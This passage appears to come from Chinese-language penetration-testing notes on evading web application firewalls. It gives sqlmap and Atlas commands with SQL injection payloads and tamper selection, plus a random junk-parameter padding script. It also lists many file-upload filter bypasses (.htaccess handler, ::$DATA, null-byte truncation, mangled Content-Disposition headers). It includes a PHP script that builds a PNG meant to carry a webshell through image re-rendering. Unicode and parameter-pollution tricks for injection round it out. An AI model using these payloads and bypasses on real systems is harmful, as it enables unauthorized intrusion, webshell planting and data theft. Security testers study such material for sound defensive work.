  #### SQL注入分块传输
	https://github.com/c0ny1/chunked-coding-converter
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/25.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/26.png)

	跑注入点被拦截
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/27.png)

	使用分块传输，右键选择
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/28.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/30.png)

	使用SQLMAP跑注入
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/31.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/32.png)

	>python sqlmap.py -r 1.txt --batch --proxy=http://127.0.0.1:8080 --dbs
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/33.png)
  #### 自动提供可用的tamper
	https://github.com/m4ll0k/Atlas
	GET类型的注入
	python atlas.py --url http://site.com/index/id/%%10%% --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
	POST类型的注入
	python atlas.py --url http://site.com/index/id/ -m POST -D 'test=%%10%%' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
	请求头注入
	python atlas.py --url http://site.com/index/id/ -H 'User-Agent: mozilla/5.0%%inject%%' -H 'X-header: test' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
	组合tamper
	python atlas.py --url http://site.com/index/id/%%10%% --payload="-1234 AND 4321=4321-- AAAA" --concat "equaltolike,htmlencode" --random-agent -v
	列出tamper
	python atlas.py -g
	例子
	注入
	python sqlmap.py -u 'http://site.com/index.php?id=Price_ASC' --dbs --random-agent -v 3
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/658.png)

	可以看到被拦截了
	查找能绕过的tamper
	python atlas.py --url 'http://site.com/index.php?id=Price_ASC' --payload="') AND 8716=4837 AND ('yajr'='yajr" --random-agent -v
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/659.png)

	根据返回码200得到一个可绕过waf的tamper
	versionedkeywords这个tamper
	继续注入
	python sqlmap.py -u 'http://site.com/index.php?id=Price_ASC' --dbs --random-agent -v 3 --tamper=versionedkeywords
	根据状态码来判断有时会有点鸡肋，但是也能用用，随机发挥吧。
  #### 垃圾数据
	#coding=utf-8
	import random,string
	from urllib import parse
	# code by yzddMr6
	varname_min = 5
	varname_max = 15
	data_min = 20
	data_max = 25
	num_min = 50
	num_max = 100
	def randstr(length):
		str_list = [random.choice(string.ascii_letters) for i in range(length)]
		random_str = ''.join(str_list)
		return random_str
	def main():
		data={}
		for i in range(num_min,num_max):
			data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))
		print('&'+parse.urlencode(data)+'&')
	main()
	放到要注入的字段前后
  #### 上传bypass
    	图片文件头
	PNG 的文件头为十六进制的 89 50 4E 47 0D 0A 1A 0A
	GIF 为 47 49 46 38 37 61
	JPG 为 FF D8 FF E0
    	添加图片头或合并图片包含
    	后缀大小写
    	文件名前缀加[0x09]
    	上传.htaccess
		SetHandler application/x-httpd-php
    	二次渲染
		GIF
		找好一个大一点的GIF，尾部使用c32插入shell，上传，下载回来，使用burp的comparer功能找出整个文件没有被渲染的位置，插入shell再上传
		JPG
		使用脚本直接生成
		https://github.com/BlackFan/jpg_payload
		PNG
		使用脚本直接生成
		先取消php.ini注释;extension=php_gd2.dll
```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
0x66, 0x44, 0x50, 0x33);
$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y < sizeof($p); $y += 3) {
	$r = $p[$y];
	$g = $p[$y+1];
	$b = $p[$y+2];
	$color = imagecolorallocate($img, $r, $g, $b);
	imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,'./1.png');
?>
```
    	上传php3,php4,phtml等
    	文件名后加::$DATA
	ConTent-Disposition: form-data; name="filepath"; filename="1.asp::$DATA"
	ConTent-Disposition: form-data; name="filepath"; filename="1.asp::$DATA\0x00\1.asp0x00.jpg"
    	asp . (空格+.)
    	php. .(点+空格+点)
    	双写phphpp
    	00截断
	Get参数00截断直接添加%00
	POST参数00截断修改hex为00
    	修改一些固定的参数
    	文件名去掉双引号
    	加一个filename1的参数
    	form变量改成f+orm
    	去掉form-data
    	在Content-Disposition或form-data;后添加多个空格
    	引号回车
	ConTent-Disposition: form-data; name="filepath"; filename="backlion.asp
	"
    	Content-Type和ConTent-Disposition调换位置
    	文件名前缀加空格
	filename=    "1.asp"
    	name前加空格
	Content-Disposition: form-data;      name="uploaded"; filename="1.asp"
    	form-data的前后加上+
	Content-Disposition: +form-data; name="filepath"; filename="1.asp"
    	* ASP+IIS
	s%elect>select
	s%u0065lect>select  
	s%u00f0lect>select
	s%u0045lect = s%u0065lect = %u00f0lect
	u -->%u0055 --> %u0075
	n -->%u004e --> %u006e
	i -->%u0049 --> %u0069
	o -->%u004f --> %u006f -->%u00ba
	s -->%u0053 --> %u0073
	l -->%u004c --> %u006c
	e -->%u0045 --> %u0065-->%u00f0
	c -->%u0043 --> %u0063
	t -->%u0054 -->%u0074 -->%u00de -->%u00fe
	f -->%u0046 -->%u0066
	r -->%u0052 -->%u0072
	m -->%u004d -->%u006d
    	Asp+iis&aspx+iis
	s%u006c%u0006ect>select
    	* apache
	TEST /sql.php?id=1 HTTP/1.1
    	* 大小写/关键字
	UniOn SeLECT
	Mid()substring() ? substr()
	Hex()?ascii()
	sleep() =benchmark()
	concat_ws()=group_concat()
    	双重url编码
    	变换请求方式
    	HPP参数污染
	id=1&id=2&id=3
	得到的结果：Asp.net + iis：id=1,2,3 
	Asp+iis：id=1,2,3 
	Php+apache：id=3
	MSSQL:
	GET+POST: 
	GET:http://192.168.125.140/test/sql.aspx?id=1 union/*
	post:  id=2*/select null,null,null
	无逗号形式：
	?id=1 union select 1&id=2&id=3&id=4 from admin--（）  
	利用逗号：
	?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--
	无效参数形式：
	?a=/*&sql=xxx&b=*/  a,b为无效参数
	溢出形式：?id=1/*&id=*//*&id=*//*......&id=*//*&id=*/ union  select null,system_user,null from INFORMATION_SCHEMA.schemata
	MYSQL：
	?id=1&id=1&id=1&id=1&id=1&id=1&id=1&id=….. &id=1 union select 1,2 from admin